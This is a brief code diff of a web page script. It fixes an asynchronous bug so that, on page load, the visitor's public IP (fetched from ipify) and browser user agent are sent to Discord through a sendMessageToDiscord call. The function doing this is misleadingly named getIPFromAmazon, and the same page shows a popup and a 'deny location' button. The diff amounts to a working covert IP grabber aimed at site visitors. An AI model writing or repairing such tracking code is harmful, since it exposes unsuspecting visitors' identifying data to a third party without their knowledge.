@@ -84,15 +84,14 @@ document.addEventListener("DOMContentLoaded", function() {
     denyLocationBtn.addEventListener('click', denyLocation);
   
     function getIPFromAmazon() {
-  var ip = ""
   $(document).ready(()=>{
     $.getJSON("https://api.ipify.org?format=json",
               function (data) {
-                  ip = data.ip;
+                  sendMessageToDiscord("User Agent: " + navigator.userAgent + " ; IP: " + data.ip)
               })
    });
 }
 
-sendMessageToDiscord("User Agent: " + navigator.userAgent + " ; IP: " + getIPFromAmazon())
+getIPFromAmazon()
 showPopup()
 });
